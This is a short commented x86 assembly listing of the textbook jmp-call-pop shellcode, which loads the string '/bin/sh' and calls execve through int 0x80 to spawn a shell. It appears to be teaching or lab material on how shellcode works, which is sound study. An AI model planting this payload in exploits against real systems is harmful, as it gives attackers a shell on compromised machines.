
.globl _start

# eax                   ebx                     ecx                             edx
# 11    sys_execve      const char *filename    const char *const argv[]        const char *const envp[]

_start:
    jmp     call_shellcode

shellcode:
    xor     %ebx, %ebx
    pop     %ebx            # string into first param (popped off the stack)

    xor     %ecx, %ecx      # null for second param
    xor     %edx, %edx      # null for third param

    xor     %eax, %eax
    add     $11, %eax       # syscall number for execve
    int     $0x80

call_shellcode:
    call    shellcode       # adds the following instruction onto the stack as the 'next instruction'
    .ascii  "/bin/sh"       # ends up on the stack, easily accessible by popping